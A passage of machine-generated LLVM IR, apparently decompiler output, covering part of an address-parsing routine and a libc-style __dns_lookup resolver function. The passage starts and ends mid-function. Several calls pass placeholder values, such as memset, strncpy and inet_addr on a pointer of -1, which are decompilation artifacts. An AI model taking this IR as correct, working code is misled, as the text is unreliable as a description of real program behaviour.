  %v10_804bf84 = icmp slt i32 %v9_804bf84, 0
  %v11_804bf84 = icmp eq i32 %v2_804bf9b34, 3
  %v12_804bf84 = icmp slt i32 %v2_804bf9b34, 3
  %v3_804bf88 = icmp eq i1 %v12_804bf84, %v10_804bf84
  %v4_804bf88 = icmp eq i1 %v11_804bf84, false
  %v5_804bf88 = and i1 %v4_804bf88, %v3_804bf88
  br i1 %v5_804bf88, label %dec_label_pc_804bf92, label %dec_label_pc_804bf8a

dec_label_pc_804bf8a:                             ; preds = %dec_label_pc_804bf84
  %v10_804bf8a = icmp eq i8 %v2_804bf76, 46
  %v1_804bf8d = icmp eq i1 %v10_804bf8a, false
  br i1 %v1_804bf8d, label %dec_label_pc_804bfc4, label %dec_label_pc_804bf8f

dec_label_pc_804bf8f:                             ; preds = %dec_label_pc_804bf8a
  %v1_804bf8f = add i32 %v0_804bf75, 1
  store i32 %v1_804bf8f, i32* @ecx, align 4
  br label %dec_label_pc_804bf9b

dec_label_pc_804bf92:                             ; preds = %dec_label_pc_804bf84
  %v1_804bf92 = add i32 %v0_804bf75, 1
  store i32 %v1_804bf92, i32* @ecx, align 4
  %v4_804bf93 = icmp eq i8 %v2_804bf76, 0
  br i1 %v4_804bf93, label %dec_label_pc_804bf9b, label %dec_label_pc_804bf97

dec_label_pc_804bf97:                             ; preds = %dec_label_pc_804bf92
  %v2_804bf97 = and i16 %v5_804bf7b, 32
  %v3_804bf97 = icmp eq i16 %v2_804bf97, 0
  br i1 %v3_804bf97, label %dec_label_pc_804bfc4, label %dec_label_pc_804bf9b

dec_label_pc_804bf9b:                             ; preds = %dec_label_pc_804bf97, %dec_label_pc_804bf92, %dec_label_pc_804bf8f
  %v0_804bf583 = phi i32 [ %v1_804bf92, %dec_label_pc_804bf97 ], [ %v1_804bf92, %dec_label_pc_804bf92 ], [ %v1_804bf8f, %dec_label_pc_804bf8f ]
  %v3_804bf9b = add nuw nsw i32 %v2_804bf9b34, 1
  %v2_804bf9e = mul i32 %v0_804bfb932, 256
  %v2_804bfa1 = or i32 %v1_804bf66, %v2_804bf9e
  %v7_804bfa7 = icmp sgt i32 %v2_804bf9b34, 3
  br i1 %v7_804bfa7, label %dec_label_pc_804bfa9, label %dec_label_pc_804bf52

dec_label_pc_804bfa9:                             ; preds = %dec_label_pc_804bf9b
  %v4_804bfa9 = icmp eq i32 %arg2, 0
  br i1 %v4_804bfa9, label %dec_label_pc_804bfc6, label %dec_label_pc_804bfb5

dec_label_pc_804bfb5:                             ; preds = %dec_label_pc_804bfa9
  %v1_804bfb9 = call i32 @llvm.bswap.i32(i32 %v2_804bfa1)
  %v2_804bfbb = inttoptr i32 %arg2 to i32*
  store i32 %v1_804bfb9, i32* %v2_804bfbb, align 4
  br label %dec_label_pc_804bfc6

dec_label_pc_804bfc4:                             ; preds = %dec_label_pc_804bf97, %dec_label_pc_804bf8a, %dec_label_pc_804bf52, %dec_label_pc_804bf66, %entry
  br label %dec_label_pc_804bfc6

dec_label_pc_804bfc6:                             ; preds = %dec_label_pc_804bfa9, %dec_label_pc_804bfb5, %dec_label_pc_804bfc4
  %v0_804bfcb = phi i32 [ 1, %dec_label_pc_804bfa9 ], [ 1, %dec_label_pc_804bfb5 ], [ 0, %dec_label_pc_804bfc4 ]
  ret i32 %v0_804bfcb

; uselistorder directives
  uselistorder i32 %v2_804bf78, { 1, 0 }
  uselistorder i32 %v6_804bf76, { 1, 0 }
  uselistorder i8 %v2_804bf76, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804bf75, { 0, 1, 3, 2 }
  uselistorder i32 %v1_804bf6d, { 1, 0 }
  uselistorder i32 %v3_804bf69, { 1, 0, 3, 2 }
  uselistorder i32 %v0_804bf5833, { 1, 0 }
  uselistorder i32 %v2_804bf9b34, { 1, 4, 2, 0, 5, 3 }
  uselistorder i32 (i32)* @llvm.bswap.i32, { 2, 0, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804bfc6, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804bfc4, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_804bf76, { 1, 0 }
  uselistorder label %dec_label_pc_804bf52, { 1, 0 }
}

define i32 @__dns_lookup(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp33 = sext i32 %arg2 to i64
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-236 = alloca i32, align 4
  %stack_var_-252 = alloca i8*, align 4
  store i32 %arg3, i32* @edi, align 4
  store i8* inttoptr (i32 512 to i8*), i8** %stack_var_-252, align 4
  %v2_804bfe2 = call i32 @malloc(i32 512)
  store i32 %v2_804bfe2, i32* %eax.global-to-local, align 4
  store i8* inttoptr (i32 1025 to i8*), i8** %stack_var_-252, align 4
  store i32 %v2_804bfe2, i32* @ebp, align 4
  %v2_804bff0 = call i32 @malloc(i32 1025)
  store i32 %v2_804bff0, i32* %eax.global-to-local, align 4
  %v12_804bff9 = ptrtoint i32* %stack_var_-236 to i32
  %v1_804bffc = icmp eq i32 %v2_804bfe2, 0
  br i1 %v1_804bffc, label %dec_label_pc_804c675, label %dec_label_pc_804c004

dec_label_pc_804c004:                             ; preds = %entry
  %v1_804c004 = icmp eq i32 %v2_804bff0, 0
  br i1 %v1_804c004, label %dec_label_pc_804c675, label %dec_label_pc_804c00c

dec_label_pc_804c00c:                             ; preds = %dec_label_pc_804c004
  %v5_804c00c = icmp eq i32 %arg2, 0
  br i1 %v5_804c00c, label %dec_label_pc_804c675, label %dec_label_pc_804c01a

dec_label_pc_804c01a:                             ; preds = %dec_label_pc_804c00c
  %v4_804c01a = ptrtoint i8* %arg1 to i32
  store i32 %v4_804c01a, i32* %eax.global-to-local, align 4
  %v2_804c021 = load i8, i8* %arg1, align 1
  %v3_804c021 = icmp eq i8 %v2_804c021, 0
  br i1 %v3_804c021, label %dec_label_pc_804c675, label %dec_label_pc_804c02a

dec_label_pc_804c02a:                             ; preds = %dec_label_pc_804c01a
  store i8* %arg1, i8** %stack_var_-252, align 4
  %v3_804c02e = call i32 @strlen(i8* nonnull %arg1)
  store i32 %v3_804c02e, i32* @eax, align 4
  store i32 %v4_804c01a, i32* %edx.global-to-local, align 4
  %v2_804c051 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_804c051, i32* @ebx, align 4
  %tmp46 = bitcast i32* %stack_var_-52 to i8*
  store i8* %tmp46, i8** %stack_var_-252, align 4
  %v3_804c059 = call i32 @__pthread_return_void(i32 %v2_804c051, i32 134526871)
  store i32 %v3_804c059, i32* %eax.global-to-local, align 4
  store i8* bitcast (i8** @global_var_8052528.84 to i8*), i8** %stack_var_-252, align 4
  %v2_804c065 = call i32 @__pthread_return_0(i32 ptrtoint (i8** @global_var_8052528.84 to i32))
  %v0_804c06a = load i64, i64* @global_var_8052540.85, align 8
  %v1_804c06a = trunc i64 %v0_804c06a to i32
  %v1_804c06f = ashr i32 %v1_804c06a, 31
  %v6_804c070 = and i64 %v0_804c06a, 4294967295
  %v8_804c070 = zext i32 %v1_804c06f to i64
  %v9_804c070 = mul nuw i64 %v8_804c070, 4294967296
  %v10_804c070 = or i64 %v9_804c070, %v6_804c070
  %v14_804c070 = srem i64 %v10_804c070, %tmp33
  %v15_804c070 = trunc i64 %v14_804c070 to i32
  %v0_804c077 = load i16, i16* @global_var_805215c.86, align 4
  %v2_804c086 = load i8*, i8** %stack_var_-252, align 4
  %v3_804c086 = ptrtoint i8* %v2_804c086 to i32
  store i32 %v3_804c086, i32* @eax, align 4
  store i32 134526871, i32* %edx.global-to-local, align 4
  store i8* %tmp46, i8** %stack_var_-252, align 4
  %v3_804c08b = call i32 @__pthread_return_void(i32 %v2_804c051, i32 1)
  store i32 %v3_804c08b, i32* %eax.global-to-local, align 4
  %v4_804c232 = inttoptr i32 %v15_804c070 to i8*
  %v1_804c65087 = add i32 %v12_804bff9, 28
  %v2_804c65088 = inttoptr i32 %v1_804c65087 to i32*
  %v3_804c65089 = load i32, i32* %v2_804c65088, align 4
  %tmp = icmp ult i32 %v3_804c65089, 3
  br i1 %tmp, label %dec_label_pc_804c0b0, label %dec_label_pc_804c675

dec_label_pc_804c0b0:                             ; preds = %dec_label_pc_804c02a, %dec_label_pc_804c650.backedge
  %v0_804c0b795 = phi i32 [ %v0_804c650.pre, %dec_label_pc_804c650.backedge ], [ %v12_804bff9, %dec_label_pc_804c02a ]
  %v1_804c0b0 = add i32 %v0_804c0b795, 20
  %v2_804c0b0 = inttoptr i32 %v1_804c0b0 to i32*
  %v3_804c0b0 = load i32, i32* %v2_804c0b0, align 4
  %v13_804c0b0 = icmp eq i32 %v3_804c0b0, -1
  br i1 %v13_804c0b0, label %dec_label_pc_804c0b0.dec_label_pc_804c0c6_crit_edge, label %dec_label_pc_804c0b7

dec_label_pc_804c0b0.dec_label_pc_804c0c6_crit_edge: ; preds = %dec_label_pc_804c0b0
  %v0_804c0c6.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c0c6

dec_label_pc_804c0b7:                             ; preds = %dec_label_pc_804c0b0
  %v3_804c0ba = load i32, i32* %v2_804c0b0, align 4
  %v5_804c0ba = add i32 %v0_804c0b795, -16
  %v6_804c0ba = inttoptr i32 %v5_804c0ba to i32*
  store i32 %v3_804c0ba, i32* %v6_804c0ba, align 4
  %v1_804c0be = call i32 @__libc_close(i32 -1)
  store i32 %v1_804c0be, i32* %eax.global-to-local, align 4
  %v0_804c0c3 = load i32, i32* @esp, align 4
  %v1_804c0c3 = add i32 %v0_804c0c3, 16
  br label %dec_label_pc_804c0c6

dec_label_pc_804c0c6:                             ; preds = %dec_label_pc_804c0b0.dec_label_pc_804c0c6_crit_edge, %dec_label_pc_804c0b7
  %v1_804c0c6 = phi i32 [ %v0_804c0b795, %dec_label_pc_804c0b0.dec_label_pc_804c0c6_crit_edge ], [ %v1_804c0c3, %dec_label_pc_804c0b7 ]
  %v0_804c0c6 = phi i32 [ %v0_804c0c6.pre, %dec_label_pc_804c0b0.dec_label_pc_804c0c6_crit_edge ], [ %v1_804c0be, %dec_label_pc_804c0b7 ]
  %v2_804c0c6 = add i32 %v1_804c0c6, -4
  %v3_804c0c6 = inttoptr i32 %v2_804c0c6 to i32*
  store i32 %v0_804c0c6, i32* %v3_804c0c6, align 4
  %v1_804c0c7 = add i32 %v1_804c0c6, -8
  %v2_804c0c7 = inttoptr i32 %v1_804c0c7 to i32*
  store i32 512, i32* %v2_804c0c7, align 4
  %v1_804c0cc = add i32 %v1_804c0c6, -12
  %v2_804c0cc = inttoptr i32 %v1_804c0cc to i32*
  store i32 0, i32* %v2_804c0cc, align 4
  %v2_804c0ce = add i32 %v1_804c0c6, -16
  %v3_804c0ce = inttoptr i32 %v2_804c0ce to i32*
  store i32 %v2_804bfe2, i32* %v3_804c0ce, align 4
  %v4_804c0cf = call i32 @__GI_memset(i8* inttoptr (i32 -1 to i8*), i32 %v15_804c070, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804c0cf, i32* %eax.global-to-local, align 4
  %v0_804c0d4 = load i32, i32* @esp, align 4
  %v1_804c0d7 = add i32 %v0_804c0d4, 8
  %v2_804c0d7 = inttoptr i32 %v1_804c0d7 to i32*
  store i32 48, i32* %v2_804c0d7, align 4
  %v1_804c0d9 = add i32 %v0_804c0d4, 4
  %v2_804c0d9 = inttoptr i32 %v1_804c0d9 to i32*
  store i32 0, i32* %v2_804c0d9, align 4
  %v1_804c0db = add i32 %v0_804c0d4, 84
  store i32 %v1_804c0db, i32* @ebx, align 4
  %v3_804c0df = inttoptr i32 %v0_804c0d4 to i32*
  store i32 %v1_804c0db, i32* %v3_804c0df, align 4
  %v4_804c0e0 = call i32 @__GI_memset(i8* inttoptr (i32 -1 to i8*), i32 %v15_804c070, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804c0e0, i32* %eax.global-to-local, align 4
  %v0_804c0e5 = load i32, i32* @esp, align 4
  %v1_804c0e5 = add i32 %v0_804c0e5, 72
  %v2_804c0e5 = inttoptr i32 %v1_804c0e5 to i32*
  %v3_804c0e5 = load i32, i32* %v2_804c0e5, align 4
  store i32 %v3_804c0e5, i32* %eax.global-to-local, align 4
  %v1_804c0e9 = add i32 %v0_804c0e5, 116
  %v2_804c0e9 = inttoptr i32 %v1_804c0e9 to i32*
  store i32 1, i32* %v2_804c0e9, align 4
  %v0_804c0f1 = load i32, i32* @esp, align 4
  %v1_804c0f1 = add i32 %v0_804c0f1, 104
  %v2_804c0f1 = inttoptr i32 %v1_804c0f1 to i32*
  store i32 1, i32* %v2_804c0f1, align 4
  %v0_804c0f9 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c0f9 = add i32 %v0_804c0f9, 1
  %v1_804c0fa = urem i32 %v1_804c0f9, 65536
  store i32 %v1_804c0fa, i32* %eax.global-to-local, align 4
  %v1_804c0ff = load i32, i32* @esp, align 4
  %v2_804c0ff = add i32 %v1_804c0ff, 72
  %v3_804c0ff = inttoptr i32 %v2_804c0ff to i32*
  store i32 %v1_804c0fa, i32* %v3_804c0ff, align 4
  %v0_804c103 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c103 = load i32, i32* @esp, align 4
  %v2_804c103 = add i32 %v1_804c103, 84
  %v3_804c103 = inttoptr i32 %v2_804c103 to i32*
  store i32 %v0_804c103, i32* %v3_804c103, align 4
  %v0_804c107 = load i32, i32* @esp, align 4
  %v1_804c10a = add i32 %v0_804c107, 8
  %v2_804c10a = inttoptr i32 %v1_804c10a to i32*
  store i32 512, i32* %v2_804c10a, align 4
  %v2_804c10f = add i32 %v0_804c107, 4
  %v3_804c10f = inttoptr i32 %v2_804c10f to i32*
  store i32 %v2_804bfe2, i32* %v3_804c10f, align 4
  %v0_804c110 = load i32, i32* @ebx, align 4
  %v3_804c110 = inttoptr i32 %v0_804c107 to i32*
  store i32 %v0_804c110, i32* %v3_804c110, align 4
  %v0_804c111 = call i32 @__encode_header()
  store i32 %v0_804c111, i32* %eax.global-to-local, align 4
  %v0_804c116 = load i32, i32* @esp, align 4
  %v2_804c119 = icmp slt i32 %v0_804c111, 0
  store i32 %v0_804c111, i32* @ebx, align 4
  br i1 %v2_804c119, label %dec_label_pc_804c675, label %dec_label_pc_804c123

dec_label_pc_804c123:                             ; preds = %dec_label_pc_804c0c6
  %v2_804c123 = add i32 %v0_804c116, 12
  %v3_804c123 = inttoptr i32 %v2_804c123 to i32*
  store i32 %v0_804c111, i32* %v3_804c123, align 4
  %v1_804c124 = add i32 %v0_804c116, 8
  %v2_804c124 = inttoptr i32 %v1_804c124 to i32*
  store i32 1025, i32* %v2_804c124, align 4
  %v1_804c129 = add i32 %v0_804c116, 256
  %v2_804c129 = inttoptr i32 %v1_804c129 to i32*
  %v3_804c129 = load i32, i32* %v2_804c129, align 4
  %v5_804c129 = add i32 %v0_804c116, 4
  %v6_804c129 = inttoptr i32 %v5_804c129 to i32*
  store i32 %v3_804c129, i32* %v6_804c129, align 4
  %v1_804c130 = add i32 %v0_804c116, 28
  %v2_804c130 = inttoptr i32 %v1_804c130 to i32*
  %v3_804c130 = load i32, i32* %v2_804c130, align 4
  %v6_804c130 = inttoptr i32 %v0_804c116 to i32*
  store i32 %v3_804c130, i32* %v6_804c130, align 4
  %v5_804c134 = call i32 @strncpy(i8* inttoptr (i32 -1 to i8*), i32 %v15_804c070, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804c139 = load i32, i32* @esp, align 4
  %v1_804c13c = add i32 %v0_804c139, 8
  %v2_804c13c = inttoptr i32 %v1_804c13c to i32*
  store i32 ptrtoint (i32* @global_var_8052160.32 to i32), i32* %v2_804c13c, align 4
  %v1_804c141 = add i32 %v0_804c139, 4
  %v2_804c141 = inttoptr i32 %v1_804c141 to i32*
  store i32 134526871, i32* %v2_804c141, align 4
  %v1_804c146 = add i32 %v0_804c139, 200
  store i32 %v1_804c146, i32* @eax, align 4
  %v3_804c14d = inttoptr i32 %v0_804c139 to i32*
  store i32 %v1_804c146, i32* %v3_804c14d, align 4
  %v2_804c14e = call i32 @__pthread_return_void(i32 -1, i32 %v15_804c070)
  store i32 %v2_804c14e, i32* %eax.global-to-local, align 4
  %v0_804c153 = load i32, i32* @esp, align 4
  %v1_804c153 = inttoptr i32 %v0_804c153 to i32*
  store i32 ptrtoint (i32* @global_var_8052160.32 to i32), i32* %v1_804c153, align 4
  %v1_804c15a = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_804c15a, i32* %eax.global-to-local, align 4
  %v0_804c15f = load i32, i32* @esp, align 4
  %v1_804c15f = add i32 %v0_804c15f, 56
  %v2_804c15f = inttoptr i32 %v1_804c15f to i32*
  %v3_804c15f = load i32, i32* %v2_804c15f, align 4
  store i32 %v3_804c15f, i32* %edx.global-to-local, align 4
  %v1_804c163 = add i32 %v0_804c15f, 268
  %v2_804c163 = inttoptr i32 %v1_804c163 to i32*
  %v3_804c163 = load i32, i32* %v2_804c163, align 4
  store i32 %v3_804c163, i32* %eax.global-to-local, align 4
  %v2_804c16a = mul i32 %v3_804c15f, 4
  %v3_804c16a = add i32 %v3_804c163, %v2_804c16a
  %v4_804c16a = inttoptr i32 %v3_804c16a to i32*
  %v5_804c16a = load i32, i32* %v4_804c16a, align 4
  store i32 %v5_804c16a, i32* %edx.global-to-local, align 4
  %v2_804c16d = add i32 %v0_804c15f, 48
  %v3_804c16d = inttoptr i32 %v2_804c16d to i32*
  store i32 %v5_804c16a, i32* %v3_804c16d, align 4
  %v0_804c171 = load i32, i32* @esp, align 4
  %v1_804c171 = add i32 %v0_804c171, 16
  %v1_804c174 = add i32 %v0_804c171, 52
  %v2_804c174 = inttoptr i32 %v1_804c174 to i32*
  %v3_804c174 = load i32, i32* %v2_804c174, align 4
  %v5_804c174 = icmp slt i32 %v3_804c174, 0
  br i1 %v5_804c174, label %dec_label_pc_804c123.dec_label_pc_804c1ba_crit_edge, label %dec_label_pc_804c17b

dec_label_pc_804c123.dec_label_pc_804c1ba_crit_edge: ; preds = %dec_label_pc_804c123
  %v0_804c1ba.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c1ba

dec_label_pc_804c17b:                             ; preds = %dec_label_pc_804c123
  store i32 %v3_804c174, i32* %eax.global-to-local, align 4
  %v1_804c17f = load i32, i32* @global_var_8054998.87, align 8
  %v2_804c17f = sub i32 %v3_804c174, %v1_804c17f
  %v8_804c17f = xor i32 %v1_804c17f, %v3_804c174
  %v9_804c17f = xor i32 %v2_804c17f, %v3_804c174
  %v10_804c17f = and i32 %v9_804c17f, %v8_804c17f
  %v11_804c17f = icmp slt i32 %v10_804c17f, 0
  %v13_804c17f = icmp slt i32 %v2_804c17f, 0
  %v2_804c185 = icmp eq i1 %v13_804c17f, %v11_804c17f
  br i1 %v2_804c185, label %dec_label_pc_804c1ba, label %dec_label_pc_804c187

dec_label_pc_804c187:                             ; preds = %dec_label_pc_804c17b
  %v2_804c187 = add i32 %v0_804c171, 12
  %v3_804c187 = inttoptr i32 %v2_804c187 to i32*
  store i32 %v3_804c174, i32* %v3_804c187, align 4
  %v1_804c188 = add i32 %v0_804c171, 8
  %v2_804c188 = inttoptr i32 %v1_804c188 to i32*
  store i32 1025, i32* %v2_804c188, align 4
  %v1_804c18d = add i32 %v0_804c171, 4
  %v2_804c18d = inttoptr i32 %v1_804c18d to i32*
  store i32 ptrtoint (i32* @global_var_80507ea.88 to i32), i32* %v2_804c18d, align 4
  %v1_804c192 = add i32 %v0_804c171, 28
  %v2_804c192 = inttoptr i32 %v1_804c192 to i32*
  %v3_804c192 = load i32, i32* %v2_804c192, align 4
  %v6_804c192 = inttoptr i32 %v0_804c171 to i32*
  store i32 %v3_804c192, i32* %v6_804c192, align 4
  %v0_804c196 = call i32 @__GI_strncat()
  store i32 %v0_804c196, i32* %eax.global-to-local, align 4
  %v0_804c19b = load i32, i32* @esp, align 4
  %v1_804c19e = add i32 %v0_804c19b, 8
  %v2_804c19e = inttoptr i32 %v1_804c19e to i32*
  store i32 1025, i32* %v2_804c19e, align 4
  %v1_804c1a3 = add i32 %v0_804c19b, 52
  %v2_804c1a3 = inttoptr i32 %v1_804c1a3 to i32*
  %v3_804c1a3 = load i32, i32* %v2_804c1a3, align 4
  store i32 %v3_804c1a3, i32* %edx.global-to-local, align 4
  %v1_804c1a7 = mul i32 %v3_804c1a3, 4
  %v2_804c1a7 = add i32 %v1_804c1a7, 134564216
  %v3_804c1a7 = inttoptr i32 %v2_804c1a7 to i32*
  %v4_804c1a7 = load i32, i32* %v3_804c1a7, align 4
  %v6_804c1a7 = add i32 %v0_804c19b, 4
  %v7_804c1a7 = inttoptr i32 %v6_804c1a7 to i32*
  store i32 %v4_804c1a7, i32* %v7_804c1a7, align 4
  %v1_804c1ae = add i32 %v0_804c19b, 28
  %v2_804c1ae = inttoptr i32 %v1_804c1ae to i32*
  %v3_804c1ae = load i32, i32* %v2_804c1ae, align 4
  %v6_804c1ae = inttoptr i32 %v0_804c19b to i32*
  store i32 %v3_804c1ae, i32* %v6_804c1ae, align 4
  %v0_804c1b2 = call i32 @__GI_strncat()
  store i32 %v0_804c1b2, i32* %eax.global-to-local, align 4
  %v0_804c1b7 = load i32, i32* @esp, align 4
  %v1_804c1b7 = add i32 %v0_804c1b7, 16
  br label %dec_label_pc_804c1ba

dec_label_pc_804c1ba:                             ; preds = %dec_label_pc_804c123.dec_label_pc_804c1ba_crit_edge, %dec_label_pc_804c17b, %dec_label_pc_804c187
  %v1_804c1ba = phi i32 [ %v1_804c171, %dec_label_pc_804c123.dec_label_pc_804c1ba_crit_edge ], [ %v1_804c171, %dec_label_pc_804c17b ], [ %v1_804c1b7, %dec_label_pc_804c187 ]
  %v0_804c1ba = phi i32 [ %v0_804c1ba.pre, %dec_label_pc_804c123.dec_label_pc_804c1ba_crit_edge ], [ %v3_804c174, %dec_label_pc_804c17b ], [ %v0_804c1b2, %dec_label_pc_804c187 ]
  %v2_804c1ba = add i32 %v1_804c1ba, -4
  %v3_804c1ba = inttoptr i32 %v2_804c1ba to i32*
  store i32 %v0_804c1ba, i32* %v3_804c1ba, align 4
  %v0_804c1bb = load i32, i32* %eax.global-to-local, align 4
  %v2_804c1bb = add i32 %v1_804c1ba, -8
  %v3_804c1bb = inttoptr i32 %v2_804c1bb to i32*
  store i32 %v0_804c1bb, i32* %v3_804c1bb, align 4
  %v1_804c1bc = add i32 %v1_804c1ba, -12
  %v2_804c1bc = inttoptr i32 %v1_804c1bc to i32*
  store i32 1, i32* %v2_804c1bc, align 4
  %v1_804c1be = add i32 %v1_804c1ba, 184
  store i32 %v1_804c1be, i32* @eax, align 4
  %v2_804c1c5 = add i32 %v1_804c1ba, -16
  %v3_804c1c5 = inttoptr i32 %v2_804c1c5 to i32*
  store i32 %v1_804c1be, i32* %v3_804c1c5, align 4
  %v2_804c1c6 = call i32 @__pthread_return_void(i32 -1, i32 %v15_804c070)
  store i32 %v2_804c1c6, i32* %eax.global-to-local, align 4
  %v0_804c1cb = load i32, i32* @esp, align 4
  %v1_804c1cb = add i32 %v0_804c1cb, 28
  %v2_804c1cb = inttoptr i32 %v1_804c1cb to i32*
  %v3_804c1cb = load i32, i32* %v2_804c1cb, align 4
  store i32 %v3_804c1cb, i32* %eax.global-to-local, align 4
  %v1_804c1cf = add i32 %v0_804c1cb, 260
  %v2_804c1cf = inttoptr i32 %v1_804c1cf to i32*
  %v3_804c1cf = load i32, i32* %v2_804c1cf, align 4
  store i32 %v3_804c1cf, i32* @edx, align 4
  %v1_804c1d6 = add i32 %v0_804c1cb, 224
  %v2_804c1d6 = inttoptr i32 %v1_804c1d6 to i32*
  store i32 1, i32* %v2_804c1d6, align 4
  %v0_804c1e1 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c1e1 = load i32, i32* @esp, align 4
  %v2_804c1e1 = add i32 %v1_804c1e1, 216
  %v3_804c1e1 = inttoptr i32 %v2_804c1e1 to i32*
  store i32 %v0_804c1e1, i32* %v3_804c1e1, align 4
  %v1_804c1ed = load i32, i32* @ebx, align 4
  %v2_804c1ed = sub i32 512, %v1_804c1ed
  store i32 %v2_804c1ed, i32* %eax.global-to-local, align 4
  %v0_804c1ef = load i32, i32* @edx, align 4
  %v1_804c1ef = load i32, i32* @esp, align 4
  %v2_804c1ef = add i32 %v1_804c1ef, 220
  %v3_804c1ef = inttoptr i32 %v2_804c1ef to i32*
  store i32 %v0_804c1ef, i32* %v3_804c1ef, align 4
  %v0_804c1f6 = load i32, i32* @esp, align 4
  %v0_804c1f9 = load i32, i32* %eax.global-to-local, align 4
  %v2_804c1f9 = add i32 %v0_804c1f6, 8
  %v3_804c1f9 = inttoptr i32 %v2_804c1f9 to i32*
  store i32 %v0_804c1f9, i32* %v3_804c1f9, align 4
  %v1_804c1fa = load i32, i32* @ebx, align 4
  %v2_804c1fa = add i32 %v1_804c1fa, %v2_804bfe2
  %v2_804c1fe = add i32 %v0_804c1f6, 4
  %v3_804c1fe = inttoptr i32 %v2_804c1fe to i32*
  store i32 %v2_804c1fa, i32* %v3_804c1fe, align 4
  %v1_804c1ff = add i32 %v0_804c1f6, 216
  store i32 %v1_804c1ff, i32* @eax, align 4
  %v3_804c206 = inttoptr i32 %v0_804c1f6 to i32*
  store i32 %v1_804c1ff, i32* %v3_804c206, align 4
  %v0_804c207 = call i32 @__encode_question()
  store i32 %v0_804c207, i32* %eax.global-to-local, align 4
  %v0_804c20c = load i32, i32* @esp, align 4
  %v2_804c20f = icmp slt i32 %v0_804c207, 0
  store i32 %v0_804c207, i32* @esi, align 4
  br i1 %v2_804c20f, label %dec_label_pc_804c675, label %dec_label_pc_804c219

dec_label_pc_804c219:                             ; preds = %dec_label_pc_804c1ba
  %v1_804c219 = add i32 %v0_804c20c, 172
  %v2_804c219 = inttoptr i32 %v1_804c219 to i16*
  store i16 2, i16* %v2_804c219, align 2
  %v1_804c223 = load i32, i32* @esp, align 4
  %v2_804c223 = add i32 %v1_804c223, -4
  %v3_804c223 = inttoptr i32 %v2_804c223 to i32*
  store i32 %v0_804c207, i32* %v3_804c223, align 4
  %v1_804c224 = add i32 %v1_804c223, 164
  store i32 %v1_804c224, i32* %eax.global-to-local, align 4
  %v2_804c22b = add i32 %v1_804c223, -8
  %v3_804c22b = inttoptr i32 %v2_804c22b to i32*
  store i32 %v1_804c224, i32* %v3_804c22b, align 4
  %v1_804c22c = add i32 %v1_804c223, 32
  %v2_804c22c = inttoptr i32 %v1_804c22c to i32*
  %v3_804c22c = load i32, i32* %v2_804c22c, align 4
  %v5_804c22c = add i32 %v1_804c223, -12
  %v6_804c22c = inttoptr i32 %v5_804c22c to i32*
  store i32 %v3_804c22c, i32* %v6_804c22c, align 4
  %v1_804c230 = add i32 %v1_804c223, -16
  %v2_804c230 = inttoptr i32 %v1_804c230 to i32*
  store i32 10, i32* %v2_804c230, align 4
  %v5_804c232 = call i32 @inet_pton(i32 -1, i8* %v4_804c232, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_804c232, i32* %eax.global-to-local, align 4
  %v0_804c237 = load i32, i32* @esp, align 4
  %v1_804c237 = add i32 %v0_804c237, 16
  %tmp47 = icmp slt i32 %v5_804c232, 1
  br i1 %tmp47, label %dec_label_pc_804c248, label %dec_label_pc_804c23e

dec_label_pc_804c23e:                             ; preds = %dec_label_pc_804c219
  %v1_804c23e = add i32 %v0_804c237, 172
  %v2_804c23e = inttoptr i32 %v1_804c23e to i16*
  store i16 10, i16* %v2_804c23e, align 2
  %v0_804c248.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804c248

dec_label_pc_804c248:                             ; preds = %dec_label_pc_804c219, %dec_label_pc_804c23e
  %v0_804c25f = phi i32 [ %v1_804c237, %dec_label_pc_804c219 ], [ %v0_804c248.pre, %dec_label_pc_804c23e ]
  %v1_804c248 = add i32 %v0_804c25f, 156
  %v2_804c248 = inttoptr i32 %v1_804c248 to i16*
  %v3_804c248 = load i16, i16* %v2_804c248, align 2
  %v12_804c248 = icmp eq i16 %v3_804c248, 10
  %v1_804c251 = icmp eq i1 %v12_804c248, false
  %v1_804c25f = add i32 %v0_804c25f, 158
  %v2_804c25f = inttoptr i32 %v1_804c25f to i16*
  store i16 13568, i16* %v2_804c25f, align 2
  %v0_804c269 = load i32, i32* @esp, align 4
  br i1 %v1_804c251, label %dec_label_pc_804c25f, label %dec_label_pc_804c27f

dec_label_pc_804c25f:                             ; preds = %dec_label_pc_804c248
  %v1_804c26c = add i32 %v0_804c269, 32
  %v2_804c26c = inttoptr i32 %v1_804c26c to i32*
  %v3_804c26c = load i32, i32* %v2_804c26c, align 4
  %v5_804c26c = add i32 %v0_804c269, -16
  %v6_804c26c = inttoptr i32 %v5_804c26c to i32*
  store i32 %v3_804c26c, i32* %v6_804c26c, align 4
  %v1_804c270 = call i32 @inet_addr(i32 -1)
  store i32 %v1_804c270, i32* %eax.global-to-local, align 4
  %v1_804c275 = load i32, i32* @esp, align 4
  %v2_804c275 = add i32 %v1_804c275, 176
  %v3_804c275 = inttoptr i32 %v2_804c275 to i32*
  store i32 %v1_804c270, i32* %v3_804c275, align 4
  %v0_804c27c = load i32, i32* @esp, align 4
  %v1_804c27c = add i32 %v0_804c27c, 16
  br label %dec_label_pc_804c27f

dec_label_pc_804c27f:                             ; preds = %dec_label_pc_804c248, %dec_label_pc_804c25f
